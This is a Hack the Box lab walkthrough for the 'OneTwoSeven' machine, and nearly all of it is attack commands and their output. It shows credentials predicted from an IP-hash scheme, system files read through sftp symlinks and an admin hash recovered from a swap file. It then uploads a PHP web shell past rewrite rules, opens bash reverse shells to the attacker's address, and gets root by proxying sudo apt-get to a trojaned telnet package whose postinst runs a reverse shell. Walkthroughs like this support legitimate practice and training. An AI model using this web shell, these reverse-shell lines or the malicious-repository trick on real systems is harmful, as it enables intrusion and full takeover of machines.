@@ -1,0 +1,647 @@
+OneTwoSeven - Hack the Box - Ubuntu Linux Hard
+-- Apt-get sudo permissions with http environment variable overwrite and directory manipulation and access with remote code execution
+
+
+We go to http://10.10.10.133/index.php
+There is a reference that DOS protection is enabled so enumeration maybe futile.
+
+We go to signup and find that a user has been created for us with credentials.
+Commands and Output:
+=====================================================================================================================================
+Username: ots-4NzkzMDE
+Password: ea879301
+You can use the provided credentials to upload your pages via sftp://onetwoseven.htb. Your personal home page will be available here.
+=====================================================================================================================================
+
+We see that the hostname of website is provided so we can edit out hosts file. We now attempt to login via sftp
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $sftp ots-4NzkzMDE@10.10.10.133
+The authenticity of host '10.10.10.133 (10.10.10.133)' can't be established.
+ECDSA key fingerprint is SHA256:+1UmP2SWwfgjoiyECyN2pRL1BIELdHrx6lt0mCwUoL0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.133' (ECDSA) to the list of known hosts.
+ots-4NzkzMDE@10.10.10.133's password: 
+Connected to 10.10.10.133.
+sftp> id
+Invalid command.
+sftp> help
+Available commands:
+bye                                Quit sftp
+cd path                            Change remote directory to 'path'
+chgrp [-h] grp path                Change group of file 'path' to 'grp'
+chmod [-h] mode path               Change permissions of file 'path' to 'mode'
+chown [-h] own path                Change owner of file 'path' to 'own'
+df [-hi] [path]                    Display statistics for current directory or
+                                   filesystem containing 'path'
+exit                               Quit sftp
+get [-afpR] remote [local]         Download file
+help                               Display this help text
+lcd path                           Change local directory to 'path'
+lls [ls-options [path]]            Display local directory listing
+lmkdir path                        Create local directory
+ln [-s] oldpath newpath            Link remote file (-s for symlink)
+lpwd                               Print local working directory
+ls [-1afhlnrSt] [path]             Display remote directory listing
+lumask umask                       Set local umask to 'umask'
+mkdir path                         Create remote directory
+progress                           Toggle display of progress meter
+put [-afpR] local [remote]         Upload file
+pwd                                Display remote working directory
+quit                               Quit sftp
+reget [-fpR] remote [local]        Resume download file
+rename oldpath newpath             Rename remote file
+reput [-fpR] local [remote]        Resume upload file
+rm path                            Delete remote file
+rmdir path                         Remove remote directory
+symlink oldpath newpath            Symlink remote file
+version                            Show SFTP version
+!command                           Execute 'command' in local shell
+!                                  Escape to local shell
+?                                  Synonym for help
+sftp> 
+=====================================================================================================================================
+
+We see public_html file so we will test to see if we can upload something and try to execute code.
+Commands and Output:
+=====================================================================================================================================
+sftp> ls
+public_html  
+sftp> cd public_html/
+sftp> ls
+index.html  
+sftp> put test.php
+Uploading test.php to /public_html/test.php
+test.php                                                                                                100%   20     0.2KB/s   00:00    
+sftp> ls
+index.html  test.php
+=====================================================================================================================================
+
+We now go to our web browser and navigate to our user public directory
+http://onetwoseven.htb/~ots-4NzkzMDE/test.php
+Commands and Output:
+=====================================================================================================================================
+Forbidden
+
+You don't have permission to access /~ots-4NzkzMDE/test.php on this server.
+=====================================================================================================================================
+
+We get forbidden message from trying to execute th payload. However there is an interesting observatio with the structure of how the 
+username and password are formulated if we run the following we find that password uses the first 8 character from the hashed ip the 
+attacker is using to access the website.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $for hash in md5 sha1 sha256; do echo -n 10.10.14.23 | ${hash}sum ; done | grep -i ea879301 
+ea879301202391042cd783affa29f92a  -
+=====================================================================================================================================
+
+The same could be said about the username where the hash is used alongside base64 to encode the username and we find that string in 
+the encode hash.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $for hash in md5 sha1 sha256; do echo -n 10.10.14.23 | ${hash}sum | base64 -w0; done |  grep -i 4NzkzMDE
+ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmEgIC0KMTQ0MzJjMmQ0NjMzOWYyYTRkYjY2ODJiMTdlNmUxZGNlNmZmNjM3YSAgLQo=ZmUwMmY3ZjU0NTUyZjVmNzU0NGQ5ZDg5NjNiNGI4OGY0M2QyNDA4OTg1YzEyOTk5NzUyZWU1YzBlN2ZjM2U3OSAgLQo=
+=====================================================================================================================================
+
+We can generate bash one liners to create usernames and passwords:
+Commands and Output:
+=====================================================================================================================================
+IP=10.10.14.7; echo -n "Username: ots-"; echo -n $IP | md5sum | base64 -w0 | cut -c4-11; echo -n "Password: "; echo -n $IP | md5sum | cut -c-8
+=====================================================================================================================================
+
+Another thing we can do is check create a symllink from the /etc/passwd to see what other users are on the box.
+Commands and Output:
+=====================================================================================================================================
+sftp> symlink /etc/passwd passwd
+sftp> ls
+index.html  passwd      test.php    
+=====================================================================================================================================
+
+We can now go to our own web page path and view this and we get the following 
+http://onetwoseven.htb/~ots-4NzkzMDE/passwd
+Commands and Output:
+=====================================================================================================================================
+ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
+ots-4NzkzMDE:x:1001:1001:10.10.14.23:/home/web/ots-4NzkzMDE:/bin/false
+=====================================================================================================================================
+
+So there is another user besides us that is in the box if we follow the same logic for creating usernames and password we may figure
+out how to login as that user. We can try 127.0.0.1 as reference to the box using the one liner script.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $IP=127.0.0.1; echo -n "Username: ots-"; echo -n $IP | md5sum | base64 -w0 | cut -c4-11; echo -n "Password: "; echo -n $IP | md5sum | cut -c-8
+Username: ots-yODc2NGQ
+Password: f528764d
+=====================================================================================================================================
+
+We indeed get the same username and we can try the passwd now.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $sftp ots-yODc2NGQ@10.10.10.133
+ots-yODc2NGQ@10.10.10.133's password: 
+Connected to 10.10.10.133.
+sftp> ls
+public_html  user.txt     
+sftp> get user.txt
+Fetching /user.txt to user.txt
+=====================================================================================================================================
+
+We can get the user.txt although this may not be the intended route. We will now go back and try to get an actual shell to the box.
+We go back to the symlnik and we can try and link to the root of the file system.
+
+Commands and Output:
+=====================================================================================================================================
+sftp> cd public_html/
+sftp> ln -s  / testing
+=====================================================================================================================================
+
+We use the web browser and go to the following: http://onetwoseven.htb/~ots-4NzkzMDE/testing/
+We could the same thing to view other file by navigating the directory 
+Commands and Output:
+=====================================================================================================================================
+Index of /~ots-4NzkzMDE/testing
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[DIR]	etc/	2019-02-20 16:39 	- 	 
+[DIR]	home/	2019-02-15 21:10 	- 	 
+[DIR]	usr/	2019-02-15 21:50 	- 	 
+[DIR]	var/	2019-02-15 19:59 	- 	 
+Apache/2.4.25 (Debian) Server at onetwoseven.htb Port 80
+=====================================================================================================================================
+
+We do the same and eventually get to the follwoing directory:
+Commands and Output:
+=====================================================================================================================================
+Index of /~ots-4NzkzMDE/testing/var/www/html-admin
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[ ]	.login.php.swp	2019-02-13 16:16 	20K	 
+[TXT]	carousel.css	2019-02-15 19:35 	1.6K	 
+[DIR]	dist/	2019-02-15 19:35 	- 	 
+Apache/2.4.25 (Debian) Server at onetwoseven.htb Port 80
+=====================================================================================================================================
+
+There is the interesting "login.php.swp" file we can download it and see what is in it using wget. Once we have recovered the file we
+can use th following vim command to view it. Once inside use ":w filename" to write to a file to view again.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www]
+└──╼ $vim -r  .login.php.swp 
+=====================================================================================================================================
+
+The first line of php file shows that we need to access the php file from a high port.
+Commands and Output:
+=====================================================================================================================================
+<?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?>$
+
+... [snip]
+
+if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {$
+if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {$
+                  $_SESSION['username'] = 'ots-admin';$
+>     header("Location: /menu.php");$
+               } else {$
+                   $msg = 'Wrong username or password.';$
+               }$
+             }$
+=====================================================================================================================================
+
+We see that there is a hash and we go to hashes.com to see if it can be decrypted and password comes back with:
+https://hashes.com/en/decrypt/hash
+Commands and Output:
+=====================================================================================================================================
+11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8:Homesweethome1
+=====================================================================================================================================
+
+So we have a new username: ots-admin and a new password: Homesweethome1
+We can now attempt to login via sftp however that does not work so instead we want to enable the admin link in the webserver. Next
+thing to do is that we have an ssh service running and we may be able to do a port forward using a known user.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $ssh -L 60080:127.0.0.1:60080 ots-4NzkzMDE@10.10.10.133
+ots-4NzkzMDE@10.10.10.133's password: 
+This service allows sftp connections only.
+Connection to 10.10.10.133 closed.
+=====================================================================================================================================
+
+It doesn't quite work though, so we need  to add "-N" command to not execute any commands
+Commands and Output:
+=====================================================================================================================================
+└──╼ $ssh -L 60080:127.0.0.1:60080 ots-4NzkzMDE@10.10.10.133 -N
+ots-4NzkzMDE@10.10.10.133's password:
+┌─[✗]─[user@parrot-virtual]─[~/htb/onetwoseven/www]
+└──╼ $ss -ntlp | column -t
+State   Recv-Q  Send-Q  Local            Address:Port  Peer                           Address:PortProcess
+LISTEN  0       128     127.0.0.1:60080  0.0.0.0:*     users:(("ssh",pid=5897,fd=5))  
+LISTEN  0       244     127.0.0.1:5432   0.0.0.0:*                                    
+LISTEN  0       244     127.0.0.1:5433   0.0.0.0:*                                    
+LISTEN  0       128     [::1]:60080      [::]:*        users:(("ssh",pid=5897,fd=4))  
+LISTEN  0       244     [::1]:5432       [::]:*                                       
+LISTEN  0       244     [::1]:5433       [::]:*
+=====================================================================================================================================
+
+We can now try to go to the http page locally on port 60080
+http://localhost:60080/
+
+We get a new login and we submit the admin user and password
+Commands and Output:
+=====================================================================================================================================
+username: ots-admin password: Homesweethome1
+http://localhost:60080/menu.php
+
+OTS Default User  [DL]
+
+OTS File Backup  [DL]
+
+OTS File Systems  [DL]
+
+OTS Addon Manager  [DL]
+
+OTS System Upgrade  [DL]
+
+OTS System Users  [DL]
+
+OTS Top Output  [DL]
+
+OTS Uptime  [DL]
+
+OTS Users  [DL]
+=====================================================================================================================================
+
+We also see we might have the possibility of uploading files
+Commands and Output:
+=====================================================================================================================================
+Plugin Upload. Admins Only!
+
+Upload new plugins to include on this status page using the upload form below.
+Disabled for security reasons.
+=====================================================================================================================================
+
+
+However the submit button is disabled. We can delete the "disabled" parameter. We also have to look at how to upload files from there
+There is a DL feature which allows us to download the php files. We download the addons php file and see rewrite rules from apache.
+
+In the url look for the addon ^addon-upload.php ^addon-download.php  and rewrite it to addons/ots-man-addon.php
+
+We look at the addon php file and see that it does a regular expresion matching if you saw correclty wehener any of the download or
+upload php file are in use it is rewritten with ots-man-addon.php to avoid this we need to pre-pend downloads first so that the 
+rewrite does not modify the upload php entry. This will allow us to execute the code in addons. So it wiil look like this:
+Commands and Output:
+=====================================================================================================================================
+Before:
+addon-download.php&/addon-upload.php
+After:
+addons/ots-man-addon.php&/addon-upload.php
+=====================================================================================================================================
+
+We will bring up burpsuite and test this assumption.
+Commands and Output:
+=====================================================================================================================================
+POST /addon-download.php&/addon-upload.php HTTP/1.1
+Host: localhost:60080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------38067483202339721043604399072
+Content-Length: 253
+Origin: http://localhost:60080
+DNT: 1
+Connection: close
+Referer: http://localhost:60080/menu.php?addon=addons/ots-man-addon.php
+Cookie: PHPSESSID=blciv6pegpu74vmoginjqfr8q3
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+
+-----------------------------38067483202339721043604399072
+Content-Disposition: form-data; name="addon"; filename="run.php"
+Content-Type: text/plain
+
+<?php system($_REQUEST['cmd']) ?> 
+
+-----------------------------38067483202339721043604399072--
+
+
+RESPONSE:
+HTTP/1.1 302 Found
+Date: Sat, 17 Apr 2021 19:42:13 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /menu.php
+Content-Length: 27
+Connection: close
+Content-Type: text/plain;charset=UTF-8
+
+File uploaded successfull.y
+=====================================================================================================================================
+
+It works successfully so now we can search for where the php might be and come to find it here:
+Commands and Output:
+=====================================================================================================================================
+http://localhost:60080/addons/run.php?cmd=ls
+ots-default-user.php ots-fs-backup.php ots-fs.php ots-man-addon.php ots-sysupdate.php ots-sysusers.php ots-top.php ots-uptime.php ots-users.php run.php
+
+localhost:60080/addons/run.php?cmd=bash -c  'bash -i >& /dev/tcp/10.10.14.23/5001 0>&1'
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+POST /addons/run.php HTTP/1.1
+Host: localhost:60080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=blciv6pegpu74vmoginjqfr8q3
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+cmd=bash+-c++'bash+-i+>%26+/dev/tcp/10.10.14.23/5001+0>%261'
+
+
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $nc -lnvp 5001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::5001
+Ncat: Listening on 0.0.0.0:5001
+Ncat: Connection from 10.10.10.133.
+Ncat: Connection from 10.10.10.133:54578.
+bash: cannot set terminal process group (1588): Inappropriate ioctl for device
+bash: no job control in this shell
+www-admin-data@onetwoseven:/var/www/html-admin/addons$ 
+
+=====================================================================================================================================
+
+Once logged in let's check to see what kind of sudo privileges we have:
+Commands and Output:
+=====================================================================================================================================
+www-admin-data@onetwoseven:/var$ sudo -l
+Matching Defaults entries for www-admin-data on onetwoseven:
+    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
+    mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-admin-data may run the following commands on onetwoseven:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+=====================================================================================================================================
+
+Interesting that we can modify the http_proxy environment variables. Seem that we might need to modify the repo packages to get a 
+root shell.
+
+Commands and Output:
+=====================================================================================================================================
+www-admin-data@onetwoseven:/var$ sudo /usr/bin/apt-get update
+Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
+  Temporary failure resolving 'packages.onetwoseven.htb'
+Err:2 http://de.deb.devuan.org/merged ascii InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
+  Temporary failure resolving 'de.deb.devuan.org'
+Reading package lists... Done
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-security/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-updates/InRelease  Temporary failure resolving 'de.deb.devuan.org'
+W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'
+W: Some index files failed to download. They have been ignored, or old ones used instead.
+=====================================================================================================================================
+
+
+We can't resolve to any of the places, lets take a look the repo
+Commands and Output:
+=====================================================================================================================================
+www-admin-data@onetwoseven:/var$ cd /etc/apt/sources.list.d/
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ 
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ ls
+devuan.list  onetwoseven.list
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat devuan.list 
+# autogenerated by devuan-baseconf
+# decomment following lines to  enable the developers devuan repository
+#deb http://packages.devuan.org/devuan ascii main
+#deb-src http://packages.devuan.org/devuan ascii main
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat onetwoseven.list 
+# OneTwoSeven special packages - not yet in use
+deb http://packages.onetwoseven.htb/devuan ascii main
+=====================================================================================================================================
+
+What we will do is got burp and test the proxy theory out. We create a new proxy listener binded to port 8000 on localhost,
+then e ill modify our hosts file so that 127.0.0.1 resolves to packages.onetwoseven.htb
+Commands and Output:
+=====================================================================================================================================
+true	10.10.14.23:8081	burp.evy@11e7534a	127.0.0.1:8000	Per-host	Default
+=====================================================================================================================================
+
+We will also start our python server and on the victim machine set the enivronment variable for the proxy.
+Commands and Output:
+=====================================================================================================================================
+python3 -m http.server
+
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ export http_proxy="http://10.10.14.23:8081"
+
+┌─[user@parrot-virtual]─[~/htb/onetwoseven]
+└──╼ $python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+^Y127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:11] "GET /devuan/dists/ascii/InRelease HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:11] "GET /merged/dists/ascii/InRelease HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:11] "GET /devuan/dists/ascii/Release HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:11] "GET /merged/dists/ascii-security/InRelease HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:11] "GET /devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:11] code 404, message File not found
+=====================================================================================================================================
+
+As you can see we get the requests forwarded from the burp proxy which was set eariler by tweaking the interface to 10.10.14.23:8081
+and the redirect to 127.0.0.1:8000 which is where our python http server is listening. We now have to trick it downloading file to 
+us.
+
+Commands and Output:
+=====================================================================================================================================
+Reading package lists... Done
+W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' does not have a Release file.
+N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+E: The repository 'http://de.deb.devuan.org/merged ascii Release' does no longer have a Release file.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+E: The repository 'http://de.deb.devuan.org/merged ascii-security Release' does no longer have a Release file.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+=====================================================================================================================================
+
+Interesting thing is that packages onetwoseven does not have a release which means repos can not be authenticated. While the rest can
+not be spoofed or easily man in the middled. Release files are like ssh pki. No real way to vallidate the packages for onetwoseven
+we will take advantage of this.
+Commands and Output:
+=====================================================================================================================================
+127.0.0.1 - - [17/Apr/2021 15:07:12] "GET /devuan/dists/ascii/main/binary-all/Packages.lzma HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:13] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.lzma HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:13] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:13] code 404, message File not found
+127.0.0.1 - - [17/Apr/2021 15:07:13] "GET /devuan/dists/ascii/main/binary-all/Packages.gz HTTP/1.1" 404 -
+127.0.0.1 - - [17/Apr/2021 15:07:13] code 404, message File not found
+=====================================================================================================================================
+
+We will make a directory from the following: /devuan/dists/ascii/main/binary-amd64/
+since it is being directly queried.
+
+Commands and Output:
+=====================================================================================================================================
+mkdir -p devuan/dists/ascii/main/binary-amd64/
+=====================================================================================================================================
+
+Based on the proxy history from burp we find that it was going to "de.deb.devuan.org" for packages. We want an example packages file 
+We can grab a copy of package locally by using dpkg and looking at a software already installed and picking one
+Commands and Output:
+=====================================================================================================================================
+dpkg -l | grep telnet
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ apt-cache show telnet
+Package: telnet
+Version: 0.17-41
+Installed-Size: 157
+Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
+Architecture: amd64
+Replaces: netstd
+Provides: telnet-client
+Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
+Description: basic telnet client
+Description-md5: 80f238fa65c82c04a1590f2a062f47bb
+Source: netkit-telnet
+Tag: admin::login, interface::shell, network::client, protocol::ipv6,
+ protocol::telnet, role::program, uitoolkit::ncurses, use::login
+Section: net
+Priority: standard
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+Size: 72008
+MD5sum: 3409d7e40403699b890c68323e200874
+SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
+
+=====================================================================================================================================
+
+We can look at the package info as well. I can download the file online from the following
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $wget http://ftp.us.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $dpkg-deb -R telnet_0.17-41_amd64.deb modified-telnet
+=====================================================================================================================================
+
+We modify te repo file inside the modified-telnet dir in DEBIAN/control and edit the version from 41 to 42, and the DEBIAN/postinst
+file and add a file to execute this case in "/tmp/.d" we then rebuild the deb file.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $dpkg-deb -b modified-telnet telnet_0.17-42_amd64.deb
+dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.
+=====================================================================================================================================
+
+
+Looking at the apt sources list will tell us what we may need to modify so that the telnet package is accepted by apt to be installed
+Commands and Output:
+=====================================================================================================================================
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$  cat /var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii_main_binary-amd64_Packages | grep -A 18 "Package: telnet$"
+Package: telnet
+Version: 0.17-41
+Installed-Size: 157
+Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
+Architecture: amd64
+Replaces: netstd
+Provides: telnet-client
+Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
+Description: basic telnet client
+Description-md5: 80f238fa65c82c04a1590f2a062f47bb
+Source: netkit-telnet
+Tag: admin::login, interface::shell, network::client, protocol::ipv6,
+ protocol::telnet, role::program, uitoolkit::ncurses, use::login
+Section: net
+Priority: standard
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+Size: 72008
+MD5sum: 3409d7e40403699b890c68323e200874
+SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
+=====================================================================================================================================
+
+We need the file size, md5 hash and sha256 hash
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $ls -l telnet_0.17-42_amd64.deb; md5sum telnet_0.17-42_amd64.deb; sha256sum telnet_0.17-42_amd64.deb 
+-rw-r--r-- 1 user user 72092 Apr 17 15:52 telnet_0.17-42_amd64.deb
+cd397a3998e8f24acb49dc5750f00eca  telnet_0.17-42_amd64.deb
+6932450bef39f0d709e4a5d047dd15d47fd0814604a7083907a5d1c6acd8df52  telnet_0.17-42_amd64.deb
+=====================================================================================================================================
+
+We then modify the packages file that has the telnet info and modify it with the new updated info. We then gzip the Packages file.
+
+Commands and Output:
+=====================================================================================================================================
+#### Make sure to change the modify the filename version as well otherwise it will grab the wrong thing and delay the process
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $gzip Packages 
+root@kali# find repo/ -type f
+repo/devuan/dists/ascii/main/binary-amd64/Packages
+repo/devuan/dists/ascii/main/binary-amd64/Packages.gz
+repo/devuan/dists/ascii/Release
+repo/devuan/pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
+=====================================================================================================================================
+
+Make sure to add the bash script that will give you a root shell.
+Commands and Output:
+=====================================================================================================================================
+root@onetwoseven:/tmp# ls -a
+ls -a
+.
+..
+.d
+root@onetwoseven:/tmp# cat .d
+cat .d
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/onetwoseven/www/devuan/dists/ascii/main/binary-amd64]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.133.
+Ncat: Connection from 10.10.10.133:49248.
+root@onetwoseven:/# whoami
+whoami
+root
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
